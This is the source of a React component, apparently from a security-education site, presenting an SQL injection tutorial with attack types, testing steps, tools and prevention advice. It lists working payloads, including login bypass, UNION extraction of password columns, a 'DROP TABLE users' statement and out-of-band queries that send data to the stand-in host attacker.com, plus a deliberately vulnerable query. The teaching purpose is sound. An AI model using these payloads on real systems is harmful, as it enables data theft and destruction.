
import React from 'react';
import { Database } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { InfoIcon } from 'lucide-react';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from '@/components/ui/accordion';

const SQLInjection: React.FC = () => {
  return (
    <section id="sql-injection" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">SQL Injection</h3>
      
      <div className="space-y-6">
        {/* Introduction */}
        <div>
          <p className="mb-4">
            SQL Injection occurs when untrusted data is sent to an interpreter as part of a command or query,
            tricking the interpreter into executing unintended commands or accessing unauthorized data. This is one of the most
            prevalent and dangerous web application vulnerabilities, potentially allowing attackers to view, modify, or delete database data.
          </p>
          
          <Alert className="mb-4 bg-red-50 text-red-900 dark:bg-red-900/20 dark:text-red-200">
            <InfoIcon className="h-4 w-4" />
            <AlertTitle>Attacker's Goal</AlertTitle>
            <AlertDescription>
              Extract sensitive data, bypass authentication, modify database content, execute administrative operations on the database,
              recover hidden data, or in some cases, issue commands to the operating system.
            </AlertDescription>
          </Alert>
        </div>
        
        {/* Vulnerable Components */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Commonly Vulnerable Components</h4>
          <ul className="list-disc pl-6 space-y-2 mb-4">
            <li><strong>Login Forms:</strong> Username/password fields that connect to databases</li>
            <li><strong>Search Features:</strong> Search boxes that query databases for matching records</li>
            <li><strong>E-commerce Systems:</strong> Product listings, category filters, order forms</li>
            <li><strong>Content Management Systems:</strong> Article lookups, user profile pages</li>
            <li><strong>API Endpoints:</strong> Backend services that process database queries</li>
            <li><strong>Report Generators:</strong> Features that compile data from databases</li>
            <li><strong>Administrative Interfaces:</strong> User management, content management systems</li>
          </ul>
        </div>
        
        {/* How SQL Injection Works */}
        <div>
          <h4 className="text-xl font-semibold mb-4">How SQL Injection Works</h4>
          <p className="mb-4">
            SQL injection attacks exploit applications that fail to properly sanitize user input before incorporating it into SQL queries.
            Attackers inject malicious SQL code that changes the logic of the intended query, allowing them to:
          </p>
          <ul className="list-disc pl-6 space-y-2 mb-4">
            <li>Bypass authentication</li>
            <li>Access sensitive data from the database</li>
            <li>Modify database data (insert, update, delete)</li>
            <li>Execute administration operations on the database</li>
            <li>Retrieve files from the system</li>
            <li>In some cases, issue commands to the operating system</li>
          </ul>
          
          <div className="my-6">
            <h5 className="font-semibold mb-4">SQL Injection Step-by-Step Attack Flow</h5>
            <ol className="list-decimal pl-6 space-y-2">
              <li><strong>Identification:</strong> Attacker identifies potential SQL injection points by testing inputs with special characters like <code>'</code>, <code>"</code>, <code>;</code>, or <code>--</code></li>
              <li><strong>Validation:</strong> If the application returns database errors or behaves unexpectedly, the attacker confirms the vulnerability</li>
              <li><strong>Information Gathering:</strong> Attacker determines database type, table names, and column structures using techniques like UNION attacks or error-based injection</li>
              <li><strong>Exploitation:</strong> With structural information acquired, the attacker crafts queries to extract, modify, or delete data</li>
              <li><strong>Advanced Attacks:</strong> Depending on permissions and database configuration, the attacker may attempt privilege escalation or command execution</li>
            </ol>
          </div>
        </div>
        
        {/* SQL Injection Types */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Types of SQL Injection</h4>
          <Tabs defaultValue="inband">
            <TabsList className="grid grid-cols-1 sm:grid-cols-3 w-full">
              <TabsTrigger value="inband">In-band SQLi</TabsTrigger>
              <TabsTrigger value="blind">Blind SQLi</TabsTrigger>
              <TabsTrigger value="outofband">Out-of-band SQLi</TabsTrigger>
            </TabsList>
            <TabsContent value="inband" className="mt-4 space-y-4">
              <p>The most common and straightforward type where the attacker receives direct response from the application.</p>
              
              <Accordion type="single" collapsible className="w-full">
                <AccordionItem value="error">
                  <AccordionTrigger className="font-semibold">Error-based</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-2">Relies on error messages thrown by the database server to obtain information about the structure of the database.</p>
                    <div className="bg-slate-800 text-white p-4 rounded-md overflow-x-auto font-mono text-sm mt-2">
                      <p className="mb-1 text-green-400"># Example payload:</p>
                      <p>' OR 1=CONVERT(int, @@version) --</p>
                    </div>
                  </AccordionContent>
                </AccordionItem>
                <AccordionItem value="union">
                  <AccordionTrigger className="font-semibold">UNION-based</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-2">Uses the UNION SQL operator to combine results from the original query with results from an injected query.</p>
                    <div className="bg-slate-800 text-white p-4 rounded-md overflow-x-auto font-mono text-sm mt-2">
                      <p className="mb-1 text-green-400"># Example payload:</p>
                      <p>' UNION SELECT 1,username,password,4 FROM users --</p>
                    </div>
                  </AccordionContent>
                </AccordionItem>
              </Accordion>
            </TabsContent>
            
            <TabsContent value="blind" className="mt-4 space-y-4">
              <p>Occurs when the application doesn't display database error messages or query results, forcing attackers to use indirect methods.</p>
              
              <Accordion type="single" collapsible className="w-full">
                <AccordionItem value="boolean">
                  <AccordionTrigger className="font-semibold">Boolean-based</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-2">Uses true/false questions to extract data by observing differences in the application's response.</p>
                    <div className="bg-slate-800 text-white p-4 rounded-md overflow-x-auto font-mono text-sm mt-2">
                      <p className="mb-1 text-green-400"># Example payload:</p>
                      <p>' OR (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' --</p>
                    </div>
                  </AccordionContent>
                </AccordionItem>
                <AccordionItem value="time">
                  <AccordionTrigger className="font-semibold">Time-based</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-2">Uses database time delay functions to extract information when there is no visible output.</p>
                    <div className="bg-slate-800 text-white p-4 rounded-md overflow-x-auto font-mono text-sm mt-2">
                      <p className="mb-1 text-green-400"># Example payload (MySQL):</p>
                      <p>' OR IF(SUBSTRING(username,1,1)='a',SLEEP(5),0) FROM users WHERE id=1 --</p>
                    </div>
                  </AccordionContent>
                </AccordionItem>
              </Accordion>
            </TabsContent>
            
            <TabsContent value="outofband" className="mt-4 space-y-4">
              <p>Used when attackers cannot receive responses directly through the application but can trigger the database to send data through alternative channels.</p>
              
              <div className="bg-slate-800 text-white p-4 rounded-md overflow-x-auto font-mono text-sm">
                <p className="mb-1 text-green-400"># Example payload (Oracle):</p>
                <p>'; SELECT UTL_HTTP.REQUEST('http://attacker.com/log?data='||banner) FROM v$version --</p>
                <p className="mt-2 text-green-400"># Example payload (SQL Server):</p>
                <p>'; EXEC master..xp_dirtree '\\attacker.com\share' --</p>
              </div>
              <p className="text-sm italic mt-2">This technique relies on specific database features that allow network connections and requires the database server to have outbound network access.</p>
            </TabsContent>
          </Tabs>
        </div>
        
        {/* Common Payloads */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Common SQL Injection Payloads</h4>
          
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>Purpose</TableHead>
                <TableHead>Payload Example</TableHead>
                <TableHead className="hidden md:table-cell">Description</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              <TableRow>
                <TableCell className="font-medium">Authentication Bypass</TableCell>
                <TableCell><code>' OR 1=1 --</code></TableCell>
                <TableCell className="hidden md:table-cell">Makes the WHERE condition always true</TableCell>
              </TableRow>
              <TableRow>
                <TableCell className="font-medium">Database Version</TableCell>
                <TableCell><code>' UNION SELECT @@version -- </code></TableCell>
                <TableCell className="hidden md:table-cell">Retrieves version information (SQL Server)</TableCell>
              </TableRow>
              <TableRow>
                <TableCell className="font-medium">Extract Table Names</TableCell>
                <TableCell><code>' UNION SELECT table_name,2 FROM information_schema.tables --</code></TableCell>
                <TableCell className="hidden md:table-cell">Lists tables from database schema</TableCell>
              </TableRow>
              <TableRow>
                <TableCell className="font-medium">Extract Column Names</TableCell>
                <TableCell><code>' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users' --</code></TableCell>
                <TableCell className="hidden md:table-cell">Lists columns from a specific table</TableCell>
              </TableRow>
              <TableRow>
                <TableCell className="font-medium">Data Extraction</TableCell>
                <TableCell><code>' UNION SELECT username,password FROM users --</code></TableCell>
                <TableCell className="hidden md:table-cell">Extracts sensitive data from database</TableCell>
              </TableRow>
              <TableRow>
                <TableCell className="font-medium">Stacked Queries</TableCell>
                <TableCell><code>'; DROP TABLE users; --</code></TableCell>
                <TableCell className="hidden md:table-cell">Executes multiple SQL statements</TableCell>
              </TableRow>
            </TableBody>
          </Table>
        </div>
        
        {/* Examples of Vulnerable Code */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Example Attack</h4>
          <CodeExample 
            language="javascript" 
            isVulnerable={true}
            title="Vulnerable SQL Query" 
            code={`// Server-side code
const userId = req.params.id;
const query = "SELECT * FROM users WHERE id = " + userId;
db.execute(query);

// Attacker input: 1 OR 1=1
// Resulting query: SELECT * FROM users WHERE id = 1 OR 1=1
// This returns all users in the database

// Another example - Login bypass:
const username = req.body.username;
const password = req.body.password;
const query = "SELECT * FROM users WHERE username = '" + username + 
              "' AND password = '" + password + "'";

// Attacker input: admin' --
// Resulting query: SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
// This comments out the password check`} 
          />
          
          <CodeExample 
            language="javascript" 
            isVulnerable={false}
            title="Secure Implementation" 
            code={`// Server-side code with parameterized queries
const userId = req.params.id;
const query = "SELECT * FROM users WHERE id = ?";
db.execute(query, [userId]);

// Parameterized queries prevent SQL injection by separating code from data

// Using an ORM (Object-Relational Mapping) for extra safety
import { PrismaClient } from '@prisma/client';
const prisma = new PrismaClient();

// Safe query using Prisma ORM
const user = await prisma.user.findUnique({
  where: {
    id: parseInt(userId)
  }
});

// Implementing additional controls:
// 1. Use the principle of least privilege for database accounts
// 2. Implement proper input validation (e.g., ensure 'id' is a number)
// 3. Use database stored procedures when possible
// 4. Enable proper error handling to avoid leaking schema details`} 
          />
        </div>
        
        {/* Step-by-Step Testing */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Step-by-Step SQL Injection Testing</h4>
          <ol className="list-decimal pl-6 space-y-2">
            <li>
              <strong>Identify Injection Points:</strong> Test all user inputs, URL parameters, cookies, HTTP headers, 
              and any other data that might be used in database queries
            </li>
            <li>
              <strong>Perform Initial Tests:</strong> Insert characters that may cause SQL syntax errors:
              <ul className="list-disc pl-6 mt-2">
                <li>Single quote (<code>'</code>) or double quote (<code>"</code>)</li>
                <li>SQL comment sequences (<code>--</code>, <code>#</code>, <code>/**/</code>)</li>
                <li>Boolean operations (<code>OR 1=1</code>, <code>AND 1=2</code>)</li>
              </ul>
            </li>
            <li>
              <strong>Analyze Response:</strong> Look for:
              <ul className="list-disc pl-6 mt-2">
                <li>Error messages revealing database information</li>
                <li>Changes in application behavior</li>
                <li>Differences in response content or timing</li>
              </ul>
            </li>
            <li>
              <strong>Identify Database Type:</strong> Different databases have specific syntax and functions:
              <ul className="list-disc pl-6 mt-2">
                <li>MySQL: <code>VERSION()</code>, <code>SUBSTRING()</code></li>
                <li>SQL Server: <code>@@VERSION</code>, <code>SUBSTRING()</code></li>
                <li>Oracle: <code>v$version</code>, <code>SUBSTR()</code></li>
                <li>PostgreSQL: <code>VERSION()</code>, <code>SUBSTRING()</code></li>
              </ul>
            </li>
            <li>
              <strong>Extract Database Structure:</strong> Retrieve table and column names using information_schema or equivalent
            </li>
            <li>
              <strong>Extract Data:</strong> Use UNION SELECT statements to retrieve data from identified tables
            </li>
            <li>
              <strong>Test Advanced Techniques:</strong> If basic injection fails, try blind techniques or out-of-band extraction
            </li>
            <li>
              <strong>Document Findings:</strong> Record all successful injection points and techniques
            </li>
          </ol>
        </div>
        
        {/* Helpful Tools */}
        <div>
          <h4 className="text-xl font-semibold mb-4">SQL Injection Testing Tools</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="border p-4 rounded-md">
              <h5 className="font-semibold mb-2">SQLmap</h5>
              <p className="text-sm">Automated SQL injection detection and exploitation tool. Can automatically detect and exploit various types of SQL injection vulnerabilities.</p>
              <p className="text-xs mt-2 italic">Usage: <code>sqlmap -u "http://example.com/page?id=1" --dbs</code></p>
            </div>
            <div className="border p-4 rounded-md">
              <h5 className="font-semibold mb-2">Burp Suite</h5>
              <p className="text-sm">Web proxy with built-in SQL injection scanner (in Professional edition) and features that facilitate manual testing.</p>
              <p className="text-xs mt-2 italic">Features: Intruder, Repeater, Scanner</p>
            </div>
            <div className="border p-4 rounded-md">
              <h5 className="font-semibold mb-2">OWASP ZAP</h5>
              <p className="text-sm">Free alternative to Burp Suite with active and passive scanning capabilities for SQL injection.</p>
              <p className="text-xs mt-2 italic">Features: Spider, Active Scanner, Fuzzer</p>
            </div>
            <div className="border p-4 rounded-md">
              <h5 className="font-semibold mb-2">NoSQLMap</h5>
              <p className="text-sm">Similar to SQLmap but designed for NoSQL database injection testing.</p>
              <p className="text-xs mt-2 italic">Useful for MongoDB, Cassandra, etc.</p>
            </div>
          </div>
        </div>
        
        {/* Prevention Techniques */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Comprehensive Prevention Techniques</h4>
          <div className="space-y-4">
            <div className="p-4 bg-green-50 dark:bg-green-900/10 rounded-md">
              <h5 className="font-semibold mb-2">1. Use Parameterized Queries (Prepared Statements)</h5>
              <p className="text-sm">The most effective defense. Ensures that user input is never treated as part of the SQL command.</p>
              <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-xs mt-2">
                <p className="text-green-400">// Using parameterized query in Node.js</p>
                <p>const query = "SELECT * FROM users WHERE username = ? AND password = ?";</p>
                <p>db.execute(query, [username, password]);</p>
              </div>
            </div>
            
            <div className="p-4 bg-green-50 dark:bg-green-900/10 rounded-md">
              <h5 className="font-semibold mb-2">2. Use ORMs (Object Relational Mapping)</h5>
              <p className="text-sm">ORMs like Sequelize, Prisma, or Hibernate typically use parameterized queries under the hood.</p>
              <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-xs mt-2">
                <p className="text-green-400">// Using Prisma ORM</p>
                <p>const user = await prisma.user.findFirst({</p>
                <p>  where: {</p>
                <p>    username: username,</p>
                <p>    password: hashedPassword</p>
                <p>  }</p>
                <p>});</p>
              </div>
            </div>
            
            <div className="p-4 bg-green-50 dark:bg-green-900/10 rounded-md">
              <h5 className="font-semibold mb-2">3. Input Validation and Sanitization</h5>
              <p className="text-sm">Always validate input against expected formats using whitelist approach.</p>
              <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-xs mt-2">
                <p className="text-green-400">// Validating numeric input</p>
                <p>const id = req.params.id;</p>
                <p>if (!Number.isInteger(parseInt(id))) {</p>
                <p>  return res.status(400).send('Invalid ID format');</p>
                <p>}</p>
              </div>
            </div>
            
            <div className="p-4 bg-green-50 dark:bg-green-900/10 rounded-md">
              <h5 className="font-semibold mb-2">4. Apply Least Privilege Principle</h5>
              <p className="text-sm">Database accounts used by applications should have the minimum necessary privileges.</p>
              <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-xs mt-2">
                <p className="text-green-400">-- Example SQL for creating a restricted user</p>
                <p>CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';</p>
                <p>GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_user'@'localhost';</p>
                <p>-- No DELETE or DROP privileges</p>
              </div>
            </div>
            
            <div className="p-4 bg-green-50 dark:bg-green-900/10 rounded-md">
              <h5 className="font-semibold mb-2">5. Implement Web Application Firewall (WAF)</h5>
              <p className="text-sm">Add a layer of protection that can detect and block common SQL injection patterns.</p>
            </div>
            
            <div className="p-4 bg-green-50 dark:bg-green-900/10 rounded-md">
              <h5 className="font-semibold mb-2">6. Error Handling</h5>
              <p className="text-sm">Use custom error pages and avoid displaying database errors to users. Log errors server-side for debugging.</p>
            </div>
            
            <div className="p-4 bg-green-50 dark:bg-green-900/10 rounded-md">
              <h5 className="font-semibold mb-2">7. Use Stored Procedures</h5>
              <p className="text-sm">Encapsulate database operations in stored procedures that only accept parameters of specific types.</p>
            </div>
          </div>
        </div>
        
        {/* Database-Specific Considerations */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Database-Specific Considerations</h4>
          <Tabs defaultValue="mysql">
            <TabsList className="grid grid-cols-2 md:grid-cols-4 w-full">
              <TabsTrigger value="mysql">MySQL</TabsTrigger>
              <TabsTrigger value="mssql">SQL Server</TabsTrigger>
              <TabsTrigger value="oracle">Oracle</TabsTrigger>
              <TabsTrigger value="nosql">NoSQL</TabsTrigger>
            </TabsList>
            
            <TabsContent value="mysql" className="mt-4">
              <ul className="list-disc pl-6 space-y-2">
                <li><strong>Special Functions:</strong> <code>SLEEP()</code>, <code>BENCHMARK()</code>, <code>LOAD_FILE()</code></li>
                <li><strong>Comments:</strong> <code>-- </code> (note the space), <code>#</code>, <code>/**/</code></li>
                <li><strong>Information Schema:</strong> <code>information_schema.tables</code>, <code>information_schema.columns</code></li>
                <li><strong>String Concatenation:</strong> <code>CONCAT()</code></li>
                <li><strong>Specific Mitigations:</strong> Disable <code>LOAD_FILE</code>, <code>INTO OUTFILE</code> when possible</li>
              </ul>
            </TabsContent>
            
            <TabsContent value="mssql" className="mt-4">
              <ul className="list-disc pl-6 space-y-2">
                <li><strong>Special Functions:</strong> <code>WAITFOR DELAY</code>, <code>xp_cmdshell</code></li>
                <li><strong>Comments:</strong> <code>--</code>, <code>/**/</code></li>
                <li><strong>System Tables:</strong> <code>sys.tables</code>, <code>sys.columns</code>, <code>INFORMATION_SCHEMA</code></li>
                <li><strong>String Concatenation:</strong> <code>+</code></li>
                <li><strong>Specific Mitigations:</strong> Disable <code>xp_cmdshell</code> and other extended procedures</li>
              </ul>
            </TabsContent>
            
            <TabsContent value="oracle" className="mt-4">
              <ul className="list-disc pl-6 space-y-2">
                <li><strong>Special Functions:</strong> <code>UTL_HTTP</code>, <code>UTL_FILE</code>, <code>DBMS_LDAP</code></li>
                <li><strong>Comments:</strong> <code>--</code></li>
                <li><strong>System Tables:</strong> <code>ALL_TABLES</code>, <code>ALL_TAB_COLUMNS</code></li>
                <li><strong>String Concatenation:</strong> <code>||</code></li>
                <li><strong>Specific Mitigations:</strong> Revoke access to UTL packages, check fine-grained access control</li>
              </ul>
            </TabsContent>
            
            <TabsContent value="nosql" className="mt-4">
              <ul className="list-disc pl-6 space-y-2">
                <li><strong>MongoDB Injections:</strong> Use of <code>$where</code> clauses with JavaScript</li>
                <li><strong>JSON Document Attacks:</strong> Parameter manipulation through JSON objects</li>
                <li><strong>Example Attack:</strong> <code>db.users.find({username: req.body.username, $where: function() { return 1==1; }})</code></li>
                <li><strong>Specific Mitigations:</strong> Avoid directly using user input in query objects, validate strict schemas</li>
                <li><strong>Prevention:</strong> Use MongoDB's query operators (<code>$eq</code>, <code>$gt</code>) instead of JavaScript expressions</li>
              </ul>
            </TabsContent>
          </Tabs>
        </div>
      </div>
    </section>
  );
};

export default SQLInjection;
